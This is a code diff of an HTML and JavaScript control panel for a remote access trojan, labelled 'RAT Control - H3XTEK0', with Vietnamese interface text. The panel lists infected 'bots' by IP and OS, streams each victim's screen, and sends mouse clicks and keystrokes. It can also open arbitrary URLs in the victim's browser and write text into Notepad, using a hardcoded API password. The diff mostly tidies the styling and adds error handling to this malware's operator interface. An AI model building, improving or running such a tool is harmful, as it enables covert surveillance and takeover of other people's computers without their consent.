@@ -6,403 +6,90 @@
     <title>RAT Control - H3XTEK0</title>
     <link rel="stylesheet" href="/style.css">
     <style>
-        /* ===== RAT SPECIFIC ===== */
-        .container-rat {
-            display: flex;
-            height: 100vh;
-            max-height: 100vh;
-            overflow: hidden;
-            background: var(--bg-dark);
-        }
-
-        /* SIDEBAR */
-        .sidebar {
-            width: 270px;
-            min-width: 200px;
-            padding: 20px 16px;
-            border-right: 1px solid var(--glass-border);
-            display: flex;
-            flex-direction: column;
-            overflow-y: auto;
-            flex-shrink: 0;
-        }
-        .sidebar h2 {
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--text-primary);
-            margin-bottom: 4px;
-            letter-spacing: 1px;
-        }
-        .sidebar .sub-info {
-            font-size: 11px;
-            color: var(--text-muted);
-            margin-bottom: 12px;
-        }
-        .sidebar .sub-info span { color: var(--text-secondary); }
-        .sidebar .refresh-btn {
-            width: 100%;
-            padding: 8px;
-            background: rgba(255, 0, 51, 0.12);
-            border: 1px solid rgba(255, 0, 51, 0.2);
-            color: var(--text-secondary);
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 12px;
-            transition: all 0.3s;
-            margin-bottom: 12px;
-        }
-        .sidebar .refresh-btn:hover {
-            background: rgba(255, 0, 51, 0.2);
-            box-shadow: 0 0 20px var(--primary-glow);
-        }
-
-        /* BOT LIST */
-        .bot-list {
-            flex: 1;
-            overflow-y: auto;
-            margin: 4px 0 12px 0;
-        }
-        .bot-item {
-            padding: 10px 12px;
-            margin: 4px 0;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 8px;
-            cursor: pointer;
-            border-left: 3px solid #ff4444;
-            transition: all 0.25s ease;
-        }
-        .bot-item.online { border-left-color: var(--primary); }
-        .bot-item:hover {
-            background: rgba(255, 0, 51, 0.08);
-            transform: translateX(4px);
-        }
-        .bot-item.active {
-            background: rgba(255, 0, 51, 0.15);
-            border-left-color: var(--primary);
-            box-shadow: 0 0 20px rgba(255, 0, 51, 0.1);
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
+        .container-rat { display: flex; height: 100vh; max-height: 100vh; overflow: hidden; background: #0a0a0f; }
+        .sidebar { width: 270px; min-width: 200px; padding: 20px 16px; border-right: 1px solid rgba(255, 0, 51, 0.25); display: flex; flex-direction: column; overflow-y: auto; flex-shrink: 0; background: rgba(20, 10, 15, 0.7); backdrop-filter: blur(12px); }
+        .sidebar h2 { font-size: 18px; font-weight: 700; color: #ff0033; margin-bottom: 4px; letter-spacing: 1px; }
+        .sidebar .sub-info { font-size: 11px; color: #884455; margin-bottom: 12px; }
+        .sidebar .sub-info span { color: #ff6677; }
+        .sidebar .refresh-btn { width: 100%; padding: 8px; background: rgba(255, 0, 51, 0.12); border: 1px solid rgba(255, 0, 51, 0.2); color: #ff6677; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.3s; margin-bottom: 12px; }
+        .sidebar .refresh-btn:hover { background: rgba(255, 0, 51, 0.2); box-shadow: 0 0 20px rgba(255, 0, 51, 0.2); }
+        .bot-list { flex: 1; overflow-y: auto; margin: 4px 0 12px 0; }
+        .bot-item { padding: 10px 12px; margin: 4px 0; background: rgba(255,255,255,0.03); border-radius: 8px; cursor: pointer; border-left: 3px solid #ff4444; transition: all 0.25s ease; }
+        .bot-item.online { border-left-color: #ff0033; }
+        .bot-item:hover { background: rgba(255, 0, 51, 0.08); transform: translateX(4px); }
+        .bot-item.active { background: rgba(255, 0, 51, 0.15); border-left-color: #ff0033; box-shadow: 0 0 20px rgba(255, 0, 51, 0.1); }
         .bot-item .name { font-weight: 600; font-size: 13px; }
-        .bot-item .ip { float: right; font-size: 11px; color: var(--text-muted); }
-        .bot-item .meta { font-size: 10px; color: var(--text-muted); margin-top: 2px; }
-
-        /* SIDEBAR QUICK ACTIONS */
-        .quick-actions {
-            border-top: 1px solid rgba(255, 0, 51, 0.1);
-            padding-top: 12px;
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-        }
-        .quick-actions button {
-            width: 100%;
-            padding: 8px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            color: #ccc;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 12px;
-            transition: all 0.3s;
-            text-align: left;
-        }
-        .quick-actions button:hover {
-            background: rgba(255, 0, 51, 0.1);
-            border-color: rgba(255, 0, 51, 0.2);
-            color: #fff;
-        }
-
-        /* MAIN AREA */
-        .main-rat {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            min-width: 0;
-        }
-
-        /* STATUS BAR */
-        .status-bar {
-            padding: 8px 16px;
-            background: rgba(20, 10, 15, 0.8);
-            border-bottom: 1px solid var(--glass-border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 4px 12px;
-            font-size: 12px;
-            color: var(--text-muted);
-            flex-shrink: 0;
-        }
-        .status-bar .bot-name { color: var(--text-secondary); font-weight: 600; }
+        .bot-item .ip { float: right; font-size: 11px; color: #884455; }
+        .bot-item .meta { font-size: 10px; color: #884455; margin-top: 2px; }
+        .quick-actions { border-top: 1px solid rgba(255, 0, 51, 0.1); padding-top: 12px; display: flex; flex-direction: column; gap: 6px; }
+        .quick-actions button { width: 100%; padding: 8px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); color: #ccc; border-radius: 8px; cursor: pointer; font-size: 12px; transition: all 0.3s; text-align: left; }
+        .quick-actions button:hover { background: rgba(255, 0, 51, 0.1); border-color: rgba(255, 0, 51, 0.2); color: #fff; }
+        .main-rat { flex: 1; display: flex; flex-direction: column; min-width: 0; }
+        .status-bar { padding: 8px 16px; background: rgba(20, 10, 15, 0.8); border-bottom: 1px solid rgba(255, 0, 51, 0.25); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 4px 12px; font-size: 12px; color: #884455; flex-shrink: 0; }
+        .status-bar .bot-name { color: #ff6677; font-weight: 600; }
         .status-bar .status-text { color: #00ff88; }
-        .status-bar .fps { color: var(--text-secondary); }
-        .status-bar .coords { font-family: monospace; font-size: 11px; color: var(--text-muted); }
-
-        /* SCREEN AREA */
-        .screen-area {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #050505;
-            position: relative;
-            overflow: hidden;
-            min-height: 200px;
-        }
-        #screenCanvas {
-            max-width: 100%;
-            max-height: 100%;
-            cursor: crosshair;
-            background: #0a0a0f;
-            object-fit: contain;
-            display: block;
-        }
-        .placeholder-text {
-            position: absolute;
-            color: #444;
-            font-size: 16px;
-            text-align: center;
-            pointer-events: none;
-            user-select: none;
-            opacity: 0.6;
-        }
-        .placeholder-text span {
-            display: block;
-            font-size: 12px;
-            color: #666;
-            margin-top: 4px;
-        }
-
-        /* CONTROLS */
-        .controls {
-            padding: 10px 16px;
-            background: rgba(20, 10, 15, 0.8);
-            border-top: 1px solid var(--glass-border);
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            align-items: center;
-            flex-shrink: 0;
-        }
-        .controls input {
-            flex: 1;
-            min-width: 100px;
-            padding: 8px 12px;
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255, 0, 51, 0.15);
-            border-radius: 8px;
-            color: #fff;
-            font-size: 12px;
-        }
+        .status-bar .fps { color: #ff6677; }
+        .status-bar .coords { font-family: monospace; font-size: 11px; color: #884455; }
+        .screen-area { flex: 1; display: flex; align-items: center; justify-content: center; background: #050505; position: relative; overflow: hidden; min-height: 200px; }
+        #screenCanvas { max-width: 100%; max-height: 100%; cursor: crosshair; background: #0a0a0f; object-fit: contain; display: block; }
+        .placeholder-text { position: absolute; color: #444; font-size: 16px; text-align: center; pointer-events: none; user-select: none; opacity: 0.6; }
+        .placeholder-text span { display: block; font-size: 12px; color: #666; margin-top: 4px; }
+        .controls { padding: 10px 16px; background: rgba(20, 10, 15, 0.8); border-top: 1px solid rgba(255, 0, 51, 0.25); display: flex; flex-wrap: wrap; gap: 8px; align-items: center; flex-shrink: 0; }
+        .controls input { flex: 1; min-width: 100px; padding: 8px 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255, 0, 51, 0.15); border-radius: 8px; color: #fff; font-size: 12px; }
         .controls input::placeholder { color: rgba(255,255,255,0.25); }
-        .controls input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 15px var(--primary-glow);
-        }
-        .controls button {
-            padding: 8px 14px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 12px;
-            transition: all 0.3s;
-            white-space: nowrap;
-        }
-        .controls .btn-ctrl {
-            background: rgba(255, 255, 255, 0.06);
-            color: #ccc;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-        }
-        .controls .btn-ctrl:hover {
-            background: rgba(255, 0, 51, 0.15);
-            border-color: var(--primary);
-            color: #fff;
-            box-shadow: 0 0 15px var(--primary-glow);
-        }
-        .controls .btn-ctrl.primary {
-            background: var(--primary);
-            color: #fff;
-            border-color: var(--primary);
-        }
-        .controls .btn-ctrl.primary:hover {
-            background: var(--primary-dark);
-            box-shadow: 0 0 25px var(--primary-glow);
-        }
-        .controls .btn-ctrl.danger {
-            background: rgba(255, 0, 68, 0.2);
-            color: #ff4444;
-            border-color: rgba(255, 0, 68, 0.2);
-        }
-        .controls .btn-ctrl.danger:hover {
-            background: rgba(255, 0, 68, 0.3);
-            box-shadow: 0 0 20px rgba(255, 0, 68, 0.2);
-        }
-
-        /* MODAL OVERRIDE */
-        .modal-content textarea {
-            width: 100%;
-            height: 140px;
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(255, 0, 51, 0.15);
-            border-radius: 8px;
-            color: #fff;
-            padding: 12px;
-            font-size: 13px;
-            resize: vertical;
-        }
-        .modal-content textarea:focus {
-            outline: none;
-            border-color: var(--primary);
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 900px) {
-            .sidebar {
-                width: 220px;
-                min-width: 160px;
-                padding: 12px;
-            }
-            .sidebar h2 { font-size: 15px; }
-        }
-
+        .controls input:focus { outline: none; border-color: #ff0033; box-shadow: 0 0 15px rgba(255, 0, 51, 0.3); }
+        .controls button { padding: 8px 14px; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 12px; transition: all 0.3s; white-space: nowrap; }
+        .controls .btn-ctrl { background: rgba(255,255,255,0.06); color: #ccc; border: 1px solid rgba(255,255,255,0.06); }
+        .controls .btn-ctrl:hover { background: rgba(255, 0, 51, 0.15); border-color: #ff0033; color: #fff; box-shadow: 0 0 15px rgba(255, 0, 51, 0.2); }
+        .controls .btn-ctrl.primary { background: #ff0033; color: #fff; border-color: #ff0033; }
+        .controls .btn-ctrl.primary:hover { background: #cc0028; box-shadow: 0 0 25px rgba(255, 0, 51, 0.4); }
+        .controls .btn-ctrl.danger { background: rgba(255, 0, 68, 0.2); color: #ff4444; border-color: rgba(255, 0, 68, 0.2); }
+        .controls .btn-ctrl.danger:hover { background: rgba(255, 0, 68, 0.3); box-shadow: 0 0 20px rgba(255, 0, 68, 0.2); }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
+        .modal.active { display: flex; }
+        .modal-content { max-width: 500px; width: 100%; padding: 28px; overflow-y: auto; position: relative; background: rgba(20, 10, 15, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 0, 51, 0.25); border-radius: 16px; box-shadow: 0 0 60px rgba(255, 0, 51, 0.15); }
+        .modal-content .close { position: absolute; top: 12px; right: 18px; font-size: 28px; cursor: pointer; color: #884455; transition: color 0.3s; line-height: 1; }
+        .modal-content .close:hover { color: #ff0033; }
+        .modal-content h3 { color: #ff0033; margin-bottom: 16px; font-size: 18px; }
+        .modal-content textarea { width: 100%; height: 140px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255, 0, 51, 0.15); border-radius: 8px; color: #fff; padding: 12px; font-size: 13px; resize: vertical; }
+        .modal-content textarea:focus { outline: none; border-color: #ff0033; }
+        .modal-content .btn { width: 100%; margin-top: 12px; }
         @media (max-width: 768px) {
-            .container-rat {
-                flex-direction: column;
-                height: 100vh;
-                overflow: hidden;
-            }
-            .sidebar {
-                width: 100%;
-                min-width: unset;
-                max-height: 180px;
-                border-right: none;
-                border-bottom: 1px solid var(--glass-border);
-                padding: 10px 12px;
-                flex-shrink: 0;
-                overflow-y: auto;
-            }
+            .sidebar { width: 100%; min-width: unset; max-height: 180px; border-right: none; border-bottom: 1px solid rgba(255, 0, 51, 0.25); padding: 10px 12px; flex-shrink: 0; overflow-y: auto; }
             .sidebar h2 { font-size: 14px; }
-            .bot-list {
-                display: flex;
-                gap: 6px;
-                overflow-x: auto;
-                padding: 4px 0;
-                flex-wrap: nowrap;
-            }
-            .bot-item {
-                flex: 0 0 auto;
-                min-width: 120px;
-                padding: 6px 10px;
-                margin: 0;
-            }
+            .bot-list { display: flex; gap: 6px; overflow-x: auto; padding: 4px 0; flex-wrap: nowrap; }
+            .bot-item { flex: 0 0 auto; min-width: 120px; padding: 6px 10px; margin: 0; }
             .bot-item .ip { float: none; display: block; }
-            .quick-actions {
-                flex-direction: row;
-                flex-wrap: wrap;
-                border-top: none;
-                padding-top: 4px;
-                gap: 4px;
-            }
-            .quick-actions button {
-                flex: 1;
-                min-width: 60px;
-                padding: 4px 8px;
-                font-size: 10px;
-                text-align: center;
-            }
-            .controls {
-                padding: 6px 10px;
-                gap: 4px;
-            }
-            .controls input {
-                font-size: 11px;
-                padding: 6px 10px;
-                min-width: 60px;
-            }
-            .controls button {
-                font-size: 10px;
-                padding: 5px 10px;
-            }
-            .status-bar {
-                font-size: 10px;
-                padding: 4px 10px;
-            }
-            .screen-area {
-                min-height: 150px;
-            }
-            #screenCanvas {
-                width: 100% !important;
-                height: auto !important;
-            }
-            .placeholder-text {
-                font-size: 13px;
-            }
-            .modal-content {
-                margin: 10px !important;
-                padding: 16px !important;
-                max-width: 95% !important;
-            }
-            .modal-content textarea {
-                height: 100px;
-                font-size: 12px;
-            }
+            .quick-actions { flex-direction: row; flex-wrap: wrap; border-top: none; padding-top: 4px; gap: 4px; }
+            .quick-actions button { flex: 1; min-width: 60px; padding: 4px 8px; font-size: 10px; text-align: center; }
+            .container-rat { flex-direction: column; height: 100vh; overflow: hidden; }
+            .controls { padding: 6px 10px; gap: 4px; }
+            .controls input { font-size: 11px; padding: 6px 10px; min-width: 60px; }
+            .controls button { font-size: 10px; padding: 5px 10px; }
+            .status-bar { font-size: 10px; padding: 4px 10px; }
+            .screen-area { min-height: 150px; }
+            .modal-content { margin: 10px; padding: 16px; max-width: 95%; }
         }
-
         @media (max-width: 480px) {
-            .sidebar {
-                max-height: 150px;
-                padding: 6px 8px;
-            }
+            .sidebar { max-height: 150px; padding: 6px 8px; }
             .sidebar h2 { font-size: 12px; }
-            .bot-item {
-                min-width: 80px;
-                padding: 4px 8px;
-                font-size: 10px;
-            }
-            .controls input {
-                font-size: 10px;
-                padding: 4px 8px;
-                min-width: 50px;
-            }
-            .controls button {
-                font-size: 9px;
-                padding: 4px 8px;
-            }
-            .status-bar {
-                font-size: 9px;
-                padding: 2px 8px;
-            }
-            .modal-content h3 { font-size: 14px; }
-        }
-
-        /* ===== SCROLLBAR TRIM ===== */
-        .bot-list::-webkit-scrollbar,
-        .sidebar::-webkit-scrollbar {
-            width: 4px;
-            height: 4px;
-        }
-        .bot-list::-webkit-scrollbar-thumb,
-        .sidebar::-webkit-scrollbar-thumb {
-            background: var(--primary);
-            border-radius: 10px;
+            .bot-item { min-width: 80px; padding: 4px 8px; font-size: 10px; }
+            .controls input { font-size: 10px; padding: 4px 8px; min-width: 50px; }
+            .controls button { font-size: 9px; padding: 4px 8px; }
+            .status-bar { font-size: 9px; padding: 2px 8px; }
         }
     </style>
 </head>
 <body>
     <div class="container-rat">
         <!-- SIDEBAR -->
-        <div class="sidebar glass">
+        <div class="sidebar">
             <h2>🎯 RAT</h2>
             <div class="sub-info">🔑 H3XTEK0 · <span id="botCount">0</span> bots online</div>
             <button class="refresh-btn" onclick="refreshBots()">🔄 Refresh</button>
-
-            <div class="bot-list" id="botList">
-                <div style="color:#444;text-align:center;padding:16px;font-size:13px;">Đang tải bot...</div>
-            </div>
-
+            <div class="bot-list" id="botList"><div style="color:#444;text-align:center;padding:16px;font-size:13px;">Đang tải bot...</div></div>
             <div class="quick-actions">
                 <button onclick="openNotepadModal()">📝 Mở Notepad</button>
                 <button onclick="openBrowserModal()">🌐 Mở Browser</button>
@@ -411,25 +98,17 @@
 
         <!-- MAIN -->
         <div class="main-rat">
-            <!-- STATUS BAR -->
             <div class="status-bar">
                 <span class="bot-name" id="currentBot">🔴 Chưa chọn bot</span>
                 <span class="status-text" id="statusText">Idle</span>
                 <span class="fps" id="fpsText">0 FPS</span>
                 <span class="coords" id="debugCoords">(0, 0)</span>
             </div>
-
-            <!-- SCREEN -->
             <div class="screen-area" id="screenArea">
                 <canvas id="screenCanvas"></canvas>
-                <div class="placeholder-text" id="placeholderText">
-                    🔴 Chọn bot để bắt đầu RAT
-                    <span>Click vào ảnh để điều khiển chuột</span>
-                </div>
+                <div class="placeholder-text" id="placeholderText">🔴 Chọn bot để bắt đầu RAT<span>Click vào ảnh để điều khiển chuột</span></div>
             </div>
-
-            <!-- CONTROLS -->
-            <div class="controls glass">
+            <div class="controls">
                 <input type="text" id="urlInput" class="input-glass" placeholder="URL..." style="flex:1;min-width:120px;">
                 <button class="btn-ctrl primary" onclick="openBrowser()">🌐 Mở</button>
                 <input type="text" id="textInput" class="input-glass" placeholder="Text..." style="flex:1;min-width:100px;">
@@ -444,27 +123,27 @@
 
     <!-- NOTEPAD MODAL -->
     <div id="notepadModal" class="modal">
-        <div class="modal-content glass glow-red">
+        <div class="modal-content">
             <span class="close" onclick="closeModal('notepadModal')">&times;</span>
             <h3>📝 Notepad Remote</h3>
             <textarea id="notepadText" placeholder="Nhập text để ghi vào notepad..."></textarea>
-            <button onclick="sendNotepad()" class="btn btn-primary" style="margin-top:12px;width:100%;">📝 Ghi vào Notepad</button>
+            <button onclick="sendNotepad()" class="btn btn-primary">📝 Ghi vào Notepad</button>
         </div>
     </div>
 
     <!-- BROWSER MODAL -->
     <div id="browserModal" class="modal">
-        <div class="modal-content glass glow-red">
+        <div class="modal-content">
             <span class="close" onclick="closeModal('browserModal')">&times;</span>
             <h3>🌐 Mở Browser</h3>
             <input type="text" id="browserUrlInput" class="input-glass" placeholder="Nhập URL..." style="width:100%;margin-top:10px;">
-            <button onclick="openBrowserFromModal()" class="btn btn-primary" style="margin-top:12px;width:100%;">🌐 Mở URL</button>
+            <button onclick="openBrowserFromModal()" class="btn btn-primary" style="margin-top:12px;">🌐 Mở URL</button>
         </div>
     </div>
 
     <script>
         // ============================================================
-        //  RAT CONTROL - FULL SCRIPT
+        //  RAT CONTROL - FULL SCRIPT (FIXED)
         // ============================================================
 
         let currentBotId = null;
@@ -479,60 +158,31 @@
         const canvas = document.getElementById('screenCanvas');
         const ctx = canvas.getContext('2d');
         const API_PASSWORD = 'H3XTEK0';
-
-        // Canvas fixed size (will be scaled by CSS)
         const CANVAS_WIDTH = 960;
         const CANVAS_HEIGHT = 640;
 
-        function getAuth() {
-            return { 'Authorization': `Bearer ${API_PASSWORD}` };
-        }
-
-        function closeModal(id) {
-            document.getElementById(id).classList.remove('active');
-            document.getElementById(id).style.display = 'none';
-        }
-
-        function openModal(id) {
-            const el = document.getElementById(id);
-            el.style.display = 'flex';
-            setTimeout(() => el.classList.add('active'), 10);
-        }
+        function getAuth() { return { 'Authorization': `Bearer ${API_PASSWORD}` }; }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); document.getElementById(id).style.display = 'none'; }
+        function openModal(id) { const el = document.getElementById(id); el.style.display = 'flex'; setTimeout(() => el.classList.add('active'), 10); }
 
         // ============================================================
-        //  TỌA ĐỘ CHÍNH XÁC - MAP TỪ CANVAS SANG MÀN HÌNH BOT
+        //  TỌA ĐỘ CHÍNH XÁC
         // ============================================================
         function getCanvasCoords(e) {
             const rect = canvas.getBoundingClientRect();
-            
-            // Tọa độ trên canvas (pixel thực tế)
             let canvasX = (e.clientX - rect.left);
             let canvasY = (e.clientY - rect.top);
-            
-            // Giới hạn
             canvasX = Math.max(0, Math.min(rect.width, canvasX));
             canvasY = Math.max(0, Math.min(rect.height, canvasY));
-            
-            // Tỷ lệ giữa canvas logic và hiển thị
             const scaleX = canvas.width / rect.width;
             const scaleY = canvas.height / rect.height;
-            
             let x = canvasX * scaleX;
             let y = canvasY * scaleY;
-            
             x = Math.max(0, Math.min(canvas.width, x));
             y = Math.max(0, Math.min(canvas.height, y));
-            
-            // MAP SANG MÀN HÌNH BOT
             const botX = Math.round((x / canvas.width) * botScreenWidth);
             const botY = Math.round((y / canvas.height) * botScreenHeight);
-            
-            return { 
-                x: botX, 
-                y: botY,
-                canvasX: Math.round(x),
-                canvasY: Math.round(y)
-            };
+            return { x: botX, y: botY, canvasX: Math.round(x), canvasY: Math.round(y) };
         }
 
         // ============================================================
@@ -544,9 +194,7 @@
                 const bots = await res.json();
                 document.getElementById('botCount').textContent = bots.length;
                 renderBotList(bots);
-            } catch (e) {
-                console.error('Lỗi refresh bot:', e);
-            }
+            } catch (e) { console.error('Lỗi refresh bot:', e); }
         }
 
         function renderBotList(bots) {
@@ -560,11 +208,7 @@
                 const div = document.createElement('div');
                 div.className = 'bot-item online';
                 if (b.bot_id === currentBotId) div.classList.add('active');
-                div.innerHTML = `
-                    <span class="name">${b.bot_id.slice(0, 8)}...</span>
-                    <span class="ip">${b.ip || 'N/A'}</span>
-                    <div class="meta">${b.os || 'Unknown'} · v${b.version || '1.0'}</div>
-                `;
+                div.innerHTML = `<span class="name">${b.bot_id.slice(0, 8)}...</span><span class="ip">${b.ip || 'N/A'}</span><div class="meta">${b.os || 'Unknown'} · v${b.version || '1.0'}</div>`;
                 div.onclick = () => selectBot(b.bot_id);
                 list.appendChild(div);
             });
@@ -575,8 +219,6 @@
         // ============================================================
         async function selectBot(botId) {
             if (currentBotId === botId) return;
-            
-            // Lấy thông tin bot (kích thước màn hình)
             try {
                 const res = await fetch('/api/bots', { headers: getAuth() });
                 const bots = await res.json();
@@ -587,15 +229,12 @@
                     console.log(`[RAT] Bot screen: ${botScreenWidth}x${botScreenHeight}`);
                 }
             } catch(e) {}
-
             if (isStreaming) stopStream();
-
             currentBotId = botId;
             document.getElementById('currentBot').textContent = `🎯 ${botId.slice(0, 8)}...`;
             document.getElementById('placeholderText').style.display = 'block';
             document.getElementById('statusText').textContent = 'Connecting...';
             ctx.clearRect(0, 0, canvas.width, canvas.height);
-
             try {
                 const res = await fetch('/api/rat/start', {
                     method: 'POST',
@@ -612,7 +251,6 @@
             } catch (e) {
                 alert('Lỗi kết nối RAT: ' + e.message);
             }
-
             refreshBots();
         }
 
@@ -624,14 +262,10 @@
             isStreaming = true;
             document.getElementById('placeholderText').style.display = 'none';
             document.getElementById('statusText').textContent = 'Streaming...';
-
             if (streamInterval) clearInterval(streamInterval);
-
             canvas.width = CANVAS_WIDTH;
             canvas.height = CANVAS_HEIGHT;
-
             fetch(`/api/rat/stream/${currentBotId}`, { headers: getAuth() });
-
             streamInterval = setInterval(async () => {
                 if (!currentBotId) return;
                 try {
@@ -640,7 +274,6 @@
                     if (data && data.result && data.result.startsWith('data:image')) {
                         const img = new Image();
                         img.onload = function() {
-                            // Vẽ ảnh đúng tỷ lệ, giữ aspect ratio
                             const imgAspect = img.width / img.height;
                             const canvasAspect = canvas.width / canvas.height;
                             let dw, dh, ox = 0, oy = 0;
@@ -663,7 +296,6 @@
                     }
                 } catch (e) { console.error('Stream error:', e); }
             }, 500);
-
             setInterval(() => {
                 fps = frameCount;
                 frameCount = 0;
@@ -717,13 +349,9 @@
             } catch (e) { console.error('Mouse event error:', e); }
         }
 
-        // ============================================================
-        //  CANVAS EVENT LISTENERS
-        // ============================================================
         canvas.addEventListener('click', (e) => {
             if (!currentBotId || !isStreaming) return;
             const coords = getCanvasCoords(e);
-            console.log(`[RAT] Click: (${coords.x}, ${coords.y})`);
             document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
             sendMouseEvent('click', coords.x, coords.y);
         });
@@ -782,64 +410,79 @@
             document.getElementById('textInput').value = '';
         }
 
+        // ============================================================
+        //  BROWSER - FIXED
+        // ============================================================
         async function openBrowser() {
             const url = document.getElementById('urlInput').value.trim() || 'https://www.google.com';
-            if (!currentBotId) return alert('Chọn bot trước!');
-            await fetch('/api/rat/event', {
-                method: 'POST',
-                headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    bot_id: currentBotId,
-                    event_type: 'browser',
-                    url: url
-                })
-            });
-            document.getElementById('urlInput').value = '';
+            if (!currentBotId) { alert('Chọn bot trước!'); return; }
+            try {
+                await fetch('/api/rat/event', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_id: currentBotId,
+                        event_type: 'browser',
+                        url: url
+                    })
+                });
+                document.getElementById('urlInput').value = '';
+                alert('✅ Đã gửi lệnh mở trình duyệt!');
+            } catch (e) {
+                alert('❌ Lỗi: ' + e.message);
+            }
+        }
+
+        function openBrowserModal() { openModal('browserModal'); }
+        function closeBrowserModal() { closeModal('browserModal'); }
+
+        async function openBrowserFromModal() {
+            const url = document.getElementById('browserUrlInput').value.trim() || 'https://www.google.com';
+            if (!currentBotId) { alert('Chọn bot trước!'); return; }
+            try {
+                await fetch('/api/rat/event', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_id: currentBotId,
+                        event_type: 'browser',
+                        url: url
+                    })
+                });
+                document.getElementById('browserUrlInput').value = '';
+                closeBrowserModal();
+                alert('✅ Đã gửi lệnh mở trình duyệt!');
+            } catch (e) {
+                alert('❌ Lỗi: ' + e.message);
+            }
         }
 
         // ============================================================
-        //  NOTEPAD
+        //  NOTEPAD - FIXED
         // ============================================================
         function openNotepadModal() { openModal('notepadModal'); }
         function closeNotepadModal() { closeModal('notepadModal'); }
 
         async function sendNotepad() {
             const text = document.getElementById('notepadText').value.trim();
-            if (!text || !currentBotId) return alert('Nhập text và chọn bot!');
-            await fetch('/api/rat/event', {
-                method: 'POST',
-                headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    bot_id: currentBotId,
-                    event_type: 'notepad',
-                    text: text
-                })
-            });
-            document.getElementById('notepadText').value = '';
-            closeNotepadModal();
-            alert('✅ Đã gửi text đến notepad!');
-        }
-
-        // ============================================================
-        //  BROWSER MODAL
-        // ============================================================
-        function openBrowserModal() { openModal('browserModal'); }
-        function closeBrowserModal() { closeModal('browserModal'); }
-
-        async function openBrowserFromModal() {
-            const url = document.getElementById('browserUrlInput').value.trim() || 'https://www.google.com';
-            if (!currentBotId) return alert('Chọn bot trước!');
-            await fetch('/api/rat/event', {
-                method: 'POST',
-                headers: { ...getAuth(), 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    bot_id: currentBotId,
-                    event_type: 'browser',
-                    url: url
-                })
-            });
-            document.getElementById('browserUrlInput').value = '';
-            closeBrowserModal();
+            if (!text) { alert('Nhập text!'); return; }
+            if (!currentBotId) { alert('Chọn bot trước!'); return; }
+            try {
+                await fetch('/api/rat/event', {
+                    method: 'POST',
+                    headers: { ...getAuth(), 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_id: currentBotId,
+                        event_type: 'notepad',
+                        text: text
+                    })
+                });
+                document.getElementById('notepadText').value = '';
+                closeNotepadModal();
+                alert('✅ Đã gửi text đến notepad!');
+            } catch (e) {
+                alert('❌ Lỗi: ' + e.message);
+            }
         }
 
         // ============================================================
@@ -848,7 +491,6 @@
         setInterval(refreshBots, 10000);
         refreshBots();
 
-        // Click outside modal to close
         document.querySelectorAll('.modal').forEach(m => {
             m.addEventListener('click', (e) => {
                 if (e.target === m) {
@@ -857,6 +499,10 @@
                 }
             });
         });
+
+        window.openBrowser = openBrowser;
+        window.sendNotepad = sendNotepad;
+        window.stopRAT = stopRAT;
     </script>
 </body>
 </html>
